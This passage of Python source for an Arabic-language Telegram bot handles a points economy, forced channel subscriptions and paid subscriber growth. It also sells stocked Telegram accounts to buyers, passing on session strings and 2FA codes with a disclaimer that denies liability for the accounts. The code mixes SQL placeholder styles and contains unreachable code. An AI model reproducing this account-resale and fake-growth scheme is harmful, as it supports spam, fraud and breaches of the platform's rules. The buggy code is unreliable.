            f"💰 رصيدك الحالي: {db_user['points'] if db_user else 0} نقطة\n"
            f"🎁 الهدية اليوم: *{gift} نقطة* {'✅ مستلمة بالفعل' if already_claimed else '— متاحة الآن!'}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    if data == "daily_gift_collect":
        today = str(date.today())
        with db_conn() as c:
            row = c.execute("SELECT last_claim FROM daily_gifts WHERE user_id=%s", (user.id,)).fetchone()
            if row and row["last_claim"] == today:
                await q.answer("⏰ لقد استلمت هديتك اليومية بالفعل! عد غداً.", show_alert=True)
                return
            gift = int(get_setting("daily_gift_points") or "50")
            c.execute(
                "INSERT INTO daily_gifts (user_id, last_claim) VALUES (%s, %s) "
                "ON CONFLICT (user_id) DO UPDATE SET last_claim=EXCLUDED.last_claim",
                (user.id, today)
            )
            c.execute("UPDATE users SET points=points+%s WHERE user_id=%s", (gift, user.id))
        db_user = get_user(user.id)
        await q.answer(f"🎁 حصلت على {gift} نقطة!", show_alert=True)
        # تحديث شاشة الهدية بعد الاستلام
        rows = [
            [InlineKeyboardButton("⏰ تم استلام هديتك اليوم — عد غداً", callback_data="noop")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="collect_points")],
        ]
        await q.edit_message_text(
            f"🎁 *الهدية اليومية*\n\n"
            f"✅ استلمت *{gift} نقطة* بنجاح!\n"
            f"💰 رصيدك الآن: {db_user['points'] if db_user else 0} نقطة",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    # ── التحقق من بوابة الاشتراك الإجباري ──
    if data == "check_mandatory_join":
        unjoined = await get_unjoined_mandatory_channels(context, user.id)
        if unjoined:
            await q.answer("❌ لم تشترك بعد بجميع القنوات المطلوبة.", show_alert=True)
            await show_mandatory_gate(update, context, unjoined, edit=True, is_owner=is_own)
            return
        await q.answer("✅ تم التحقق من اشتراكك!")
        db_user = get_user(user.id)
        if db_user and db_user.get("verified", 0):
            # مستخدم متحقق سابقاً اضطُرّ للانضمام لقناة جديدة → عَدّه وأعد القائمة
            await count_user_for_fundings(user.id, context)
            context.user_data["state"] = "main_menu"
            db_user = get_user(user.id)
            pts = db_user["points"] if db_user else 0
            await q.edit_message_text(
                f"✅ *تم التحقق! أهلاً بك مجدداً.*\n\n💰 رصيدك: {pts} نقطة",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=main_menu_kb(is_own)
            )
        else:
            await proceed_after_mandatory(update, context, edit=True)
        return

    # ── انضمام بقنوات ──
    if data == "join_channels":
        with db_conn() as c:
            channels = c.execute(
                "SELECT * FROM mandatory_channels WHERE active=1 AND funding_type='internal' ORDER BY id"
            ).fetchall()
        if not channels:
            await q.edit_message_text(
                "📡 لا توجد قنوات للانضمام حالياً.",
                reply_markup=back_kb("collect_points")
            )
            return
        reward = int(get_setting("join_channel_reward") or "45")
        db_user = get_user(user.id)
        rows = []
        for ch in channels:
            with db_conn() as c:
                claimed = c.execute(
                    "SELECT 1 FROM channel_join_rewards WHERE user_id=%s AND channel_id=%s",
                    (user.id, ch["id"])
                ).fetchone()
            rows.append([InlineKeyboardButton(
                f"📢 @{ch['channel_username']}",
                url=f"https://t.me/{ch['channel_username']}"
            )])
            if not claimed:
                rows.append([InlineKeyboardButton(
                    f"✅ تحقق من انضمامي (+{reward} نقطة)",
                    callback_data=f"join_verify:{ch['id']}"
                )])
            else:
                rows.append([InlineKeyboardButton("✔️ تم الحصول على نقاطك", callback_data="noop")])
        rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="collect_points")])
        await q.edit_message_text(
            f"📡 *الانضمام بقنوات*\n\n"
            f"💰 رصيدك الحالي: {db_user['points'] if db_user else 0} نقطة\n"
            f"🎁 انضم لأي قناة واحصل على *{reward} نقطة*\n"
            f"اضغط ✅ تحقق من انضمامي بعد الانضمام:"
            f"{_leave_penalty_note()}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    # ── التحقق من الانضمام ومنح النقاط (إصلاح: ذري وآمن) ──
    if data.startswith("join_verify:"):
        ch_id = int(data.split(":")[1])
        with db_conn() as c:
            ch = c.execute("SELECT * FROM mandatory_channels WHERE id=%s", (ch_id,)).fetchone()
        if not ch:
            await q.answer("⚠️ القناة غير موجودة.", show_alert=True)
            return
        # تحقق مسبق من الحصول على النقاط
        with db_conn() as c:
            already = c.execute(
                "SELECT 1 FROM channel_join_rewards WHERE user_id=%s AND channel_id=%s",
                (user.id, ch_id)
            ).fetchone()
        if already:
            await q.answer("✔️ لقد حصلت على نقاط هذه القناة سابقاً.", show_alert=True)
            return
        # تحقق من أن المستخدم فعلاً منضم
        try:
            member = await context.bot.get_chat_member(f"@{ch['channel_username']}", user.id)
            is_member = member.status not in ("left", "kicked", "banned")
        except Exception:
            await q.answer("⚠️ تعذّر التحقق. تأكد أنك انضممت ثم حاول.", show_alert=True)
            return
        if not is_member:
            await q.answer("❌ لم تنضم بعد! انضم للقناة أولاً ثم اضغط تحقق.", show_alert=True)
            return
        reward = int(get_setting("join_channel_reward") or "45")
        # إدراج ذري مع فحص التكرار عبر RETURNING
        with db_conn() as c:
            c.execute(
                "INSERT INTO channel_join_rewards (user_id, channel_id, joined_at) VALUES (%s, %s, NOW()) "
                "ON CONFLICT (user_id, channel_id) DO NOTHING",
                (user.id, ch_id)
            )
            inserted = c.rowcount
            if inserted > 0:
                c.execute("UPDATE users SET points=points+%s WHERE user_id=%s", (reward, user.id))
        if not inserted:
            await q.answer("✔️ لقد حصلت على نقاط هذه القناة سابقاً.", show_alert=True)
            return
        db_user = get_user(user.id)
        await q.answer(f"🎉 حصلت على {reward} نقطة!", show_alert=True)
        # تحديث الشاشة — إعادة بناء القائمة
        with db_conn() as c:
            channels = c.execute(
                "SELECT * FROM mandatory_channels WHERE active=1 AND funding_type='internal' ORDER BY id"
            ).fetchall()
        rows = []
        for ch2 in channels:
            with db_conn() as c:
                claimed = c.execute(
                    "SELECT 1 FROM channel_join_rewards WHERE user_id=%s AND channel_id=%s",
                    (user.id, ch2["id"])
                ).fetchone()
            rows.append([InlineKeyboardButton(
                f"📢 @{ch2['channel_username']}",
                url=f"https://t.me/{ch2['channel_username']}"
            )])
            if not claimed:
                rows.append([InlineKeyboardButton(
                    f"✅ تحقق من انضمامي (+{reward} نقطة)",
                    callback_data=f"join_verify:{ch2['id']}"
                )])
            else:
                rows.append([InlineKeyboardButton("✔️ تم الحصول على نقاطك", callback_data="noop")])
        rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="join_channels")])
        await q.edit_message_text(
            f"📡 *الانضمام بقنوات*\n\n"
            f"🎁 انضم لأي قناة واحصل على *{reward} نقطة*\n"
            f"💰 رصيدك الآن: {db_user['points'] if db_user else 0} نقطة"
            f"{_leave_penalty_note()}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    # ── شحن نقاط ──
    if data == "charge_points":
        try:
            await q.edit_message_text("💎 *اختر طريقة الشحن:*", parse_mode=ParseMode.MARKDOWN,
                                       reply_markup=charge_points_kb())
        except Exception as _e:
            logger.error(f"❌ charge_points error: {_e}")
            if is_own:
                await q.answer(f"❌ خطأ: {_e}", show_alert=True)
        return

    if data == "charge:stars":
        rate = get_setting("star_to_points") or "250"
        await q.edit_message_text(
            f"⭐ *الشحن عبر النجوم*\n\n💡 سعر النجمة الواحدة = {rate} نقطة\n\nاختر الكمية أو الطريقة:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=charge_stars_kb()
        )
        return

    if data == "charge:info":
        await q.answer("هذا مجرد عرض للسعر.", show_alert=False)
        return

    # ── شحن سريع بعدد محدد من النجوم ──
    if data.startswith("charge:quick:"):
        stars = int(data.split(":")[2])
        rate  = int(get_setting("star_to_points") or "250")
        pts   = stars * rate
        await q.edit_message_text(
            f"⭐ *{stars} نجمة = {pts} نقطة*\n\nجارٍ تحضير الفاتورة...",
            parse_mode=ParseMode.MARKDOWN
        )
        await context.bot.send_invoice(
            chat_id=user.id,
            title="شحن نقاط",
            description=f"شراء {pts} نقطة مقابل {stars} نجمة",
            payload=f"charge_stars:{stars}:{user.id}",
            provider_token="",
            currency="XTR",
            prices=[LabeledPrice("نجوم", stars)],
        )
        return

    if data == "charge:by_points":
        rate = get_setting("star_to_points") or "250"
        context.user_data["state"] = "await_charge_points_amount"
        await q.edit_message_text(
            f"💡 *ملاحظة:* سعر النجمة الواحدة = {rate} نقطة\n\nأرسل عدد النقاط التي تريدها:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "charge:by_stars":
        rate = get_setting("star_to_points") or "250"
        context.user_data["state"] = "await_charge_stars_amount"
        await q.edit_message_text(
            f"💡 *ملاحظة:* سعر النجمة الواحدة = {rate} نقطة\n\nأرسل عدد النجوم المراد شحنها:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "charge:asiacell":
        asiacell_txt = get_setting("asiacell_text") or "⚠️ الشحن التلقائي عبر اسيا سيل غير متاح حالياً.\nيرجى التواصل مع المالك."
        kb_rows = contact_owner_row() + [[InlineKeyboardButton("🔙 رجوع", callback_data="charge_points")]]
        await q.edit_message_text(asiacell_txt, reply_markup=InlineKeyboardMarkup(kb_rows))
        return

    # ── استبدال نقاط ──
    if data == "exchange_points":
        await q.edit_message_text("🏆 *استبدال النقاط بجوائز:*",
                                   parse_mode=ParseMode.MARKDOWN, reply_markup=exchange_kb())
        return

    if data == "exchange:stars":
        rate = int(get_setting("exchange_star_rate") or "2000")
        with db_conn() as c:
            packages = c.execute("SELECT * FROM exchange_star_packages WHERE active=1 ORDER BY stars").fetchall()
        if not packages:
            kb_rows = contact_owner_row() + [[InlineKeyboardButton("🔙 رجوع", callback_data="exchange_points")]]
            await q.edit_message_text(
                "⚠️ لا توجد باقات استبدال متاحة حالياً.\nتواصل مع المالك لإضافة باقات.",
                reply_markup=InlineKeyboardMarkup(kb_rows)
            )
            return
        rows = []
        for pkg in packages:
            stars = pkg["stars"]
            cost = stars * rate
            rows.append([InlineKeyboardButton(f"⭐ {stars} نجمة = {cost} نقطة", callback_data=f"exchange:pkg:{stars}")])
        rows += contact_owner_row()
        rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="exchange_points")])
        await q.edit_message_text(
            f"⭐ *استبدال نقاط بنجوم*\n\n"
            f"💡 سعر النجمة الواحدة: {rate} نقطة\n\n"
            f"اختر الباقة المطلوبة:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return

    if data.startswith("exchange:pkg:"):
        stars = int(data.split(":")[2])
        rate = int(get_setting("exchange_star_rate") or "2000")
        cost = stars * rate
        db_user = get_user(user.id)
        pts = db_user["points"] if db_user else 0
        if pts < cost:
            kb_rows = contact_owner_row() + [[InlineKeyboardButton("🔙 رجوع", callback_data="exchange:stars")]]
            await q.edit_message_text(
                f"❌ *نقاطك غير كافية!*\n\n"
                f"⭐ تحتاج: {cost} نقطة\n"
                f"💎 رصيدك: {pts} نقطة",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup(kb_rows)
            )
            return
        if not deduct_points(user.id, cost):
            await q.edit_message_text("❌ حدث خطأ في خصم النقاط.", reply_markup=back_kb("exchange:stars"))
            return
        code = next_order_code(user.id)
        with db_conn() as c:
            pe = c.execute(
                "INSERT INTO prize_exchanges (user_id,prize_type,prize_value,points_cost,status,order_code) "
                "VALUES (%s,%s,%s,%s,'pending',%s) RETURNING id",
                (user.id, "stars", str(stars), cost, code)
            ).fetchone()
        custom_msg = get_setting("exchange_success_msg") or ""
        result_kb_rows = contact_owner_row() + [[InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="main_menu")]]
        await q.edit_message_text(
            f"✅ *تمت العملية بنجاح!*\n\n"
            f"⭐ طلب {stars} نجمة مسجل\n"
            f"💰 التكلفة: {cost} نقطة\n\n"
            + (f"{custom_msg}\n\n" if custom_msg else "")
            + "سيتواصل معك المالك قريباً.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(result_kb_rows)
        )
        await context.bot.send_message(
            user.id,
            f"📌 *كود عمليتك:* `{code}`",
            parse_mode=ParseMode.MARKDOWN
        )
        await notify_prize_exchange_owner(
            context, pe["id"],
            f"⭐ <b>طلب شراء نجوم (جائزة)</b>\n"
            f"👤 <a href='tg://user?id={user.id}'>{user.full_name}</a>\n"
            f"⭐ {stars} نجمة مقابل {cost} نقطة\n"
            f"📌 {code}"
        )
        return

    if data == "exchange:number":
        if not is_number_exchange_on():
            await q.answer("🔒 استبدال الأرقام مغلق حالياً. تواصل مع المالك.", show_alert=True)
            return
        cost = int(get_setting("telegram_number_cost") or "5000")
        db_user = get_user(user.id)
        if db_user["points"] < cost:
            kb_rows = contact_owner_row() + [[InlineKeyboardButton("🔙 رجوع", callback_data="exchange_points")]]
            await q.edit_message_text(
                f"❌ نقاطك غير كافية! تحتاج {cost} نقطة ولديك {db_user['points']} نقطة.",
                reply_markup=InlineKeyboardMarkup(kb_rows)
            )
            return
        if not deduct_points(user.id, cost):
            await q.edit_message_text("❌ حدث خطأ في خصم النقاط.", reply_markup=back_kb("exchange_points"))
            return
        code = next_order_code(user.id)

        # ── تسليم تلقائي إن وُجد رقم متاح بالمخزون (مع تحقق كامل من 2FA + جهاز واحد) ──
        auto = await assign_verified_number(user.id, bot=context.bot)
        if auto:
            auto_number = auto["phone_number"]
            session_str = auto["session_string"]
            with db_conn() as c:
                pe = c.execute(
                    "INSERT INTO prize_exchanges (user_id,prize_type,prize_value,points_cost,status,order_code) "
                    "VALUES (?,?,?,?,'completed',?) RETURNING id",
                    (user.id, "telegram_number", auto_number, cost, code)
                ).fetchone()
            display_number = auto_number.lstrip("+")
            result_kb = [
                [
                    InlineKeyboardButton("🔐 رمز التحقق (2FA)", callback_data=f"buyer:show_twofa:{auto_number}"),
                    InlineKeyboardButton("🔑 كود الدخول", callback_data=f"buyer:request_code:{auto_number}"),
                ],
                [InlineKeyboardButton("🔙 القائمة الرئيسية", callback_data="main_menu")],
            ]
            await q.edit_message_text(
                f"✅ *تم شراء رقمك بنجاح!*\n\n"
                f"📱 *الرقم:*\n`{display_number}`\n\n"
                f"اضغط على الأزرار أدناه للحصول على رمز التحقق وكود الدخول عند الحاجة.",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup(result_kb)
            )
            # ─── رسالة التبرئة ───
            try:
                await context.bot.send_message(
                    user.id,
                    "📋 *إشعار تبرئة ذمة — يُرجى القراءة بعناية*\n\n"
                    "بإتمامك عملية الشراء فإنك تُقرّ وتوافق على ما يلي:\n\n"
                    "① لا يتحمّل البائع أي مسؤولية عن أي محتوى موجود داخل الحساب سابقاً، "
                    "سواء كان مجموعات، قنوات، محادثات، جهات اتصال، صور، ملفات، أو أي بيانات أخرى.\n\n"
                    "② لا يتحمّل البائع أي مسؤولية عن أي حظر، تقييد، أو إجراء تتخذه منصة تيليغرام "
                    "على الحساب لاحقاً بسبب أي نشاط سابق أو لاحق.\n\n"
                    "③ لا يتحمّل البائع أي مسؤولية عن أي استخدام سابق للرقم أو الحساب قبل تاريخ بيعه.\n\n"
                    "④ من لحظة الاستلام يُصبح الحساب والرقم مسؤوليتك الكاملة والمطلقة؛ "
                    "أي حظر، تجميد، أو تغيير يطرأ عليه لاحقاً لا يخصّ البائع بأي شكل.\n\n"
                    "⑤ لا يحق المطالبة باسترداد أو تعويض بعد استلام بيانات الدخول.\n\n"
                    "شكراً لثقتك 🤍",
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception:
                pass
            # ─── مغادرة فورية بعد التسليم ───
            async def _auto_leave_after_exchange(_ph=auto_number, _uid=user.id, _bot=context.bot):
                await asyncio.sleep(0)
                try:
                    await _stop_number_monitor(_ph)
                except Exception:
                    pass
                try:
                    with db_conn() as _clx:
                        _clx.execute(
                            "UPDATE number_stock SET assigned_to=NULL, assigned_at=NULL, force_listed=FALSE "
                            "WHERE phone_number=%s", (_ph,)
                        )
                except Exception:
                    pass
                try:
                    await _bot.send_message(_uid, "🤖 البوت غادر الحساب تلقائياً. الحساب أصبح بيدك كاملاً 🤍")
                except Exception:
                    pass
            asyncio.create_task(_auto_leave_after_exchange())
            # (إشعار المالك عن التسليم أُلغي بناءً على طلب المالك)
            return

        # ── لا يوجد رقم متاح — إعادة النقاط فوراً ──
        add_points(user.id, cost)
        await q.edit_message_text(
            "😔 *نأسف، لم تتم العملية*\n\n"
            "لا يتوفر حالياً أي رقم متاح في المخزون.\n"
            f"تم إعادة *{cost:,} نقطة* إلى رصيدك كاملةً.\n\n"
            "يمكنك المحاولة مجدداً في وقت لاحق 🙏",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔙 القائمة الرئيسية", callback_data="main_menu")
            ]])
        )
        return

    # ── شراء رقم عبر كود ──
    if data == "exchange:num_code":
        if not is_number_exchange_on():
            await q.answer("🔒 شراء الأرقام مغلق حالياً. تواصل مع المالك.", show_alert=True)
            return
        context.user_data["state"] = "await_num_purchase_code"
        await q.edit_message_text(
            "🎟 *شراء رقم تيلغرام عبر كود*\n\n"
            "أرسل الكود الخاص بك لإتمام عملية الشراء:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=back_kb("exchange_points")
        )
        return

    # ── استخدام كود ترويجي ──
    if data == "use_promo":
        context.user_data["state"] = "await_promo_code"
        await q.edit_message_text(
            "🎟 *استخدام كود ترويجي*\n\nأرسل الكود:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=back_kb()
        )
        return

    # ── تحويل النقاط ──
    if data == "transfer_points":
        context.user_data["state"] = "await_transfer_id"
        await q.edit_message_text("↔️ *تحويل النقاط*\n\nأرسل ايدي المستلم (رقمي):", parse_mode=ParseMode.MARKDOWN)
        return

    # ── معلوماتي ──
    if data == "my_info":
        db_user = get_user(user.id)
        if not db_user:
            await q.edit_message_text("⚠️ لم يتم العثور على بياناتك. أرسل /start أولاً.")
            return
        with db_conn() as c:
            inv_credited = c.execute(
                "SELECT COUNT(*) as cnt FROM users WHERE invited_by=? AND referral_credited=1",
                (user.id,)
            ).fetchone()["cnt"]
            inv_pending  = c.execute(
                "SELECT COUNT(*) as cnt FROM users WHERE invited_by=? AND referral_credited=0",
                (user.id,)
            ).fetchone()["cnt"]
        invited_line = f"{inv_credited} مكتمل"
        if inv_pending:
            invited_line += f" + {inv_pending} بانتظار التحقق"
        await q.edit_message_text(
            f"👤 *معلوماتك:*\n\n"
            f"🆔 معرفك: `{user.id}`\n"
            f"💰 نقاطك: {db_user['points']}\n"
            f"👥 من دعوتهم: {invited_line}\n"
            f"📦 عدد طلباتك: {db_user['total_orders']}\n"
            f"🔢 رقمك في البوت: #{db_user['bot_user_num']}\n"
            f"📅 تاريخ الانضمام: {db_user['joined_at']}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=back_kb()
        )
        return

    # ── تمويل القناة ──
    if data == "fund_channel":
        await q.edit_message_text("📺 *تمويل قناتك حقيقي:*", parse_mode=ParseMode.MARKDOWN,
                                   reply_markup=fund_channel_kb())
        return

    if data == "fund:mandatory":
        _stars_min    = int(get_setting("mandatory_stars_min_members")    or "50")
        _stars_t1_max = int(get_setting("mandatory_stars_tier1_max")      or "120")
        _t1_x100      = int(get_setting("mandatory_stars_tier1_price_x100") or "50")
        _t2_x100      = int(get_setting("mandatory_stars_tier2_price_x100") or "33")
        _pts_price    = int(get_setting("mandatory_points_price") or "5")
        _pts_min      = int(get_setting("mandatory_points_min")   or "50")
        await q.edit_message_text(
            f"📢 *تمويل قناة إجباري*\n\n"
            f"اختر طريقة الدفع:\n\n"
            f"⭐ *بالنجوم:* {_stars_min:,}–{_stars_t1_max:,} عضو → كل عضوان بـ 1⭐ | {_stars_t1_max+1:,}+ → كل 3 بـ 1⭐\n"
            f"💰 *بالنقاط:* {_pts_price} نقطة/عضو | حد أدنى {_pts_min:,} عضو",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⭐ الدفع بالنجوم", callback_data="fund:mandatory:stars")],
                [InlineKeyboardButton("💰 الدفع بالنقاط", callback_data="fund:mandatory:points")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="fund_channel")],
            ])
        )
        return

    if data == "fund:mandatory:stars":
        _stars_min    = int(get_setting("mandatory_stars_min_members")    or "50")
        _stars_t1_max = int(get_setting("mandatory_stars_tier1_max")      or "120")
        _t1_x100      = int(get_setting("mandatory_stars_tier1_price_x100") or "50")
        _t2_x100      = int(get_setting("mandatory_stars_tier2_price_x100") or "33")
        context.user_data["fund_type"] = "mandatory"
        context.user_data["state"]     = "await_fund_member_count"
        await q.edit_message_text(
            f"📢 *تمويل إجباري — الدفع بالنجوم ⭐*\n\n"
            f"📊 *جدول الأسعار:*\n"
            f"  • {_stars_min:,} – {_stars_t1_max:,} عضو: كل *عضوان* بـ *1 ⭐*\n"
            f"  • {_stars_t1_max+1:,} وأكثر: كل *3 أعضاء* بـ *1 ⭐*\n"
            f"  • الحد الأدنى: *{_stars_min:,} عضو*\n\n"
            f"📊 *الخطوة 1/3:* أرسل *عدد أعضاء قناتك* الحالي:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "fund:mandatory:points":
        _pts_price = int(get_setting("mandatory_points_price") or "5")
        _pts_min   = int(get_setting("mandatory_points_min")   or "50")
        context.user_data["fund_type"] = "mandatory_points"
        context.user_data["state"]     = "await_fund_member_count"
        await q.edit_message_text(
            f"📢 *تمويل إجباري — الدفع بالنقاط 💰*\n\n"
            f"💰 السعر: *{_pts_price} نقطة لكل عضو*\n"
            f"👥 الحد الأدنى: *{_pts_min:,} عضو*\n\n"
            f"📊 *الخطوة 1/3:* أرسل *عدد أعضاء قناتك* الحالي:",
            parse_mode=ParseMode.MARKDOWN
        )
        return
        # ─── تمويل إجباري بالنجوم (Stars) ───
        _stars_min    = int(get_setting("mandatory_stars_min_members")    or "50")
        _stars_t1_max = int(get_setting("mandatory_stars_tier1_max")      or "120")
        _t1_x100      = int(get_setting("mandatory_stars_tier1_price_x100") or "50")
        _t2_x100      = int(get_setting("mandatory_stars_tier2_price_x100") or "33")
        context.user_data["fund_type"] = "mandatory"
        context.user_data["state"]     = "await_fund_member_count"
        await q.edit_message_text(
            f"📢 *تمويل قناة إجباري — الدفع بالنجوم ⭐*\n\n"
            f"✅ ستُضاف قناتك كقناة اشتراك إجباري في البوت\n\n"
            f"📊 *جدول الأسعار:*\n"
            f"  • {_stars_min:,} – {_stars_t1_max:,} عضو: كل *عضوان* بـ *1 ⭐*\n"
            f"  • {_stars_t1_max+1:,} وأكثر: كل *3 أعضاء* بـ *1 ⭐*\n"
            f"  • الحد الأدنى: *{_stars_min:,} عضو*\n\n"
            f"📊 *الخطوة 1/3:* أرسل *عدد أعضاء قناتك* الحالي:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data == "fund:internal":
        cost_per = get_setting("internal_channel_cost") or "100"
        min_members = get_setting("internal_channel_min_members") or "0"
        context.user_data["fund_type"] = "internal"
        context.user_data["state"]     = "await_fund_member_count"
        min_txt = f"👥 الحد الأدنى للأعضاء: *{int(min_members):,}*\n" if int(min_members) > 0 else ""
        await q.edit_message_text(
            f"🔄 *تمويل قناة داخلي بطيء*\n\n"
            f"✅ ستُضاف قناتك في قسم انضم بقنوات\n"
            f"👥 الأعضاء يجمعون نقاط وينضمون لقناتك\n"
            f"💰 السعر: *{cost_per} نقطة لكل عضو*\n"
            f"{min_txt}\n"
            f"📊 *الخطوة 1/3:* أرسل *عدد أعضاء قناتك* الحالي:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    # ── تأكيد تمويل القناة ──
    if data == "fund_confirm:yes":
        fund_type    = context.user_data.get("fund_type", "mandatory")
        channel      = context.user_data.get("fund_channel_username", "")
        member_count = context.user_data.get("fund_member_count", 1)
        cost_key     = "mandatory_channel_cost" if fund_type == "mandatory" else "internal_channel_cost"
        cost_per     = int(get_setting(cost_key) or "200")
        cost         = context.user_data.get("fund_total_cost", cost_per * member_count)
        ft_label     = "إجباري سريع" if fund_type in ("mandatory", "mandatory_points") else "داخلي بطيء"
        channel_md   = md_escape(channel)
        if not channel:
            await q.edit_message_text("⚠️ انتهت الجلسة، ابدأ من جديد.", reply_markup=main_menu_kb(is_own))
            context.user_data["state"] = "main_menu"
            return
        if not deduct_points(user.id, cost):
            await q.edit_message_text(f"❌ نقاطك غير كافية. التكلفة الإجمالية: {cost:,} نقطة.", reply_markup=main_menu_kb(is_own))
            context.user_data["state"] = "main_menu"
            return
        code = next_order_code(user.id)

        # ── الحد الأقصى 10 قنوات إجبارية نشطة في نفس الوقت: إن كانت ممتلئة، تدخل القناة الجديدة قائمة انتظار ──
        is_queued = False
        if fund_type in ("mandatory", "mandatory_points") and count_active_mandatory_channels() >= MANDATORY_MAX_ACTIVE:
            is_queued = True

        with db_conn() as c:
            c.execute(
                "INSERT INTO channel_funding (user_id,channel_username,funding_type,cost_points,target_members,current_members,status) "
                "VALUES (%s,%s,%s,%s,%s,0,'active')",
                (user.id, channel, fund_type, cost, member_count)
            )
            c.execute(
                "INSERT INTO mandatory_channels (channel_username,owner_user_id,funding_type,active,queued) "
                "VALUES (%s,%s,%s,%s,%s) "
                "ON CONFLICT (channel_username) DO UPDATE SET funding_type=EXCLUDED.funding_type, owner_user_id=EXCLUDED.owner_user_id, "
                "active=EXCLUDED.active, queued=EXCLUDED.queued",
                (channel, user.id, fund_type, 0 if is_queued else 1, 1 if is_queued else 0)
            )
        context.user_data["state"] = "main_menu"
        context.user_data.pop("fund_channel_username", None)
        context.user_data.pop("fund_member_count", None)
        context.user_data.pop("fund_total_cost", None)

        if is_queued:
            await q.edit_message_text(
                f"⏳ *تم استلام تمويل قناتك وسُحبت النقاط بنجاح، لكنها في قائمة الانتظار حالياً.*\n\n"
                f"📢 القناة: @{channel_md}\n"
                f"👥 عدد الأعضاء: {member_count:,}\n"
                f"💰 التكلفة: {cost_per} × {member_count:,} = *{cost:,} نقطة*\n\n"
                f"⚠️ عدد القنوات الإجبارية النشطة حالياً بلغ الحد الأقصى ({MANDATORY_MAX_ACTIVE} قنوات).\n"
                f"✅ ستُفعَّل قناتك تلقائياً وتظهر لجميع المستخدمين فور تحرّر أحد الأماكن (عند اكتمال إحدى القنوات العشرة).",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=main_menu_kb(is_own)
            )
        else:
            await q.edit_message_text(
                f"✅ *تم تفعيل تمويل قناتك بنجاح!*\n\n"
                f"📢 القناة: @{channel_md}\n"
                f"⚙️ النوع: {ft_label}\n"
                f"👥 عدد الأعضاء: {member_count:,}\n"
                f"💰 التكلفة: {cost_per} × {member_count:,} = *{cost:,} نقطة*",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=main_menu_kb(is_own)
            )
        await context.bot.send_message(
            user.id,
            f"📌 *كود عمليتك:* `{code}`\nاحفظه قد تحتاجه لاحقاً.",
            parse_mode=ParseMode.MARKDOWN
        )

        _queue_note = "\n⏳ <b>ملاحظة:</b> دخلت قائمة الانتظار (الحد الأقصى ممتلئ) وستُفعَّل تلقائياً عند توفر مكان." if is_queued else ""
        _terms = mandatory_terms_text_html() if fund_type in ("mandatory", "mandatory_points") else ""
        await notify_group(
            context.application,
            f"📢 <b>تمويل قناة {ft_label}</b>\n"
            f"👤 <a href='tg://user?id={user.id}'>{user.full_name}</a>\n"
            f"📡 القناة: @{channel}\n"
            f"👥 {member_count:,} عضو\n"
            f"💰 {cost:,} نقطة ({cost_per} × {member_count:,})\n"
            f"📌 {code}"
            f"{_queue_note}\n"
            f"{_terms}"
        )
        return

    if data == "fund_confirm:no":
        context.user_data["state"] = "main_menu"
        context.user_data.pop("fund_channel_username", None)
        context.user_data.pop("fund_member_count", None)
        await q.edit_message_text("❌ تم إلغاء طلب التمويل.", reply_markup=main_menu_kb(is_own))
        return

    # ── إعدادات المالك ──
    if data == "owner_settings" and is_own:
        if context.user_data.get("state", "").startswith("await_mb_"):
            context.user_data["state"] = "main_menu"
            for k in ("mb_menu", "mb_type", "mb_label"):
                context.user_data.pop(k, None)
        await q.edit_message_text("⚙️ *إعدادات المالك:*", parse_mode=ParseMode.MARKDOWN,
                                   reply_markup=owner_settings_kb())
        return

    # ────────────────────────────────────────────────────────
    #  إدارة أزرار القوائم (إضافة/حذف/ترتيب/تحجيم)
    # ────────────────────────────────────────────────────────
    if data == "os:manage_buttons" and is_own:
        if context.user_data.get("state", "").startswith("await_mb_"):
            context.user_data["state"] = "main_menu"
            for k in ("mb_menu", "mb_type", "mb_label"):
                context.user_data.pop(k, None)
        rows = [[InlineKeyboardButton(MENU_LABELS.get(m, m), callback_data=f"mb_menu:{m}")]
                for m in MANAGEABLE_MENUS]
        rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="owner_settings")])
        await q.edit_message_text("🧩 *إدارة الأزرار:*\nاختر القائمة التي تريد التحكم بها:",
                                   parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(rows))
        return

    if data.startswith("mb_menu:") and is_own:
        menu = data.split(":", 1)[1]
        context.user_data.pop("mb_menu", None)
        context.user_data.pop("mb_type", None)
        context.user_data.pop("mb_label", None)
        if context.user_data.get("state", "").startswith("await_mb_"):
            context.user_data["state"] = "main_menu"
        text, kb = render_mb_menu_screen(menu)
        await q.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
        return

    if (data.startswith("mb_up:") or data.startswith("mb_down:")) and is_own:
        direction, rest = data.split(":", 1)
